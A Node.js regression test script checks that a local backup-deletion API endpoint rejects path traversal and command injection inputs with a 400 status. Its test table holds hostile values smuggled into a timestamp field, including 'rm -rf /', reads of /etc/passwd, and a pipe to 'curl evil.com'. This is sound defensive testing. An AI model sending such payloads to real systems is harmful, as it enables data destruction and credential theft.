#!/usr/bin/env node

/**
 * Security Test Script
 * Tests the fixed path traversal vulnerability to ensure it's properly protected
 * Run this with: node test-security-fix.js
 */

const http = require('http');
const path = require('path');

// Test configuration
const SERVER_URL = 'http://localhost:3001';
const TEST_CASES = [
  // Path traversal attempts
  { timestamp: '../../../etc/passwd', expected: 400, description: 'Unix path traversal' },
  { timestamp: '..\\..\\..\\windows\\system32\\config', expected: 400, description: 'Windows path traversal' },
  { timestamp: '/etc/passwd', expected: 400, description: 'Absolute path' },
  { timestamp: 'C:\\Windows\\System32\\file.txt', expected: 400, description: 'Windows absolute path' },
  
  // Command injection attempts
  { timestamp: '1234567890123; rm -rf /', expected: 400, description: 'Command injection with semicolon' },
  { timestamp: '1234567890123 && cat /etc/passwd', expected: 400, description: 'Command injection with &&' },
  { timestamp: '1234567890123|curl evil.com', expected: 400, description: 'Command injection with pipe' },
  { timestamp: '1234567890123`rm -rf /`', expected: 400, description: 'Command injection with backticks' },
  
  // Invalid formats
  { timestamp: 'abc1234567890', expected: 400, description: 'Non-numeric characters' },
  { timestamp: '12345', expected: 400, description: 'Too short' },
  { timestamp: '123456789012345', expected: 400, description: 'Too long' },
  { timestamp: '', expected: 400, description: 'Empty string' },
  
  // Future timestamp (should fail)
  { timestamp: (Date.now() + 10000).toString(), expected: 400, description: 'Future timestamp' },
  
  // Very old timestamp (should fail)
  { timestamp: '1000000000000', expected: 400, description: 'Very old timestamp (2001)' },
  
  // Valid timestamp (should return 404 since file won't exist, but not 400)
  { timestamp: Date.now().toString(), expected: 404, description: 'Valid timestamp (file not found)' },
];

async function testEndpoint(timestamp, expectedStatus, description) {
  return new Promise((resolve) => {
    const url = `${SERVER_URL}/api/config/services/backup/${timestamp}`;
    
    const req = http.request(url, { method: 'DELETE' }, (res) => {
      let data = '';
      res.on('data', chunk => data += chunk);
      res.on('end', () => {
        const success = res.statusCode === expectedStatus;
        console.log(`${success ? '✅' : '❌'} ${description}`);
        console.log(`   Expected: ${expectedStatus}, Got: ${res.statusCode}`);
        if (!success) {
          console.log(`   Response: ${data}`);
        }
        console.log();
        resolve(success);
      });
    });

    req.on('error', (err) => {
      console.log(`❌ ${description} - Request failed: ${err.message}`);
      console.log();
      resolve(false);
    });

    req.end();
  });
}

async function runSecurityTests() {
  console.log('🔒 Security Test Suite - Path Traversal Protection');
  console.log('=' .repeat(60));
  console.log();
  
  console.log('Testing endpoint: DELETE /api/config/:type/backup/:timestamp');
  console.log('Expected behavior: Reject all malicious inputs with 400 Bad Request');
  console.log();

  let passed = 0;
  let total = TEST_CASES.length;

  for (const testCase of TEST_CASES) {
    const success = await testEndpoint(
      testCase.timestamp,
      testCase.expected,
      testCase.description
    );
    if (success) passed++;
  }

  console.log('=' .repeat(60));
  console.log(`Results: ${passed}/${total} tests passed`);
  
  if (passed === total) {
    console.log('🎉 All security tests passed! Path traversal vulnerability is fixed.');
    process.exit(0);
  } else {
    console.log('⚠️  Some security tests failed. Review the implementation.');
    process.exit(1);
  }
}

// Run tests
runSecurityTests().catch(err => {
  console.error('Test runner error:', err);
  process.exit(1);
});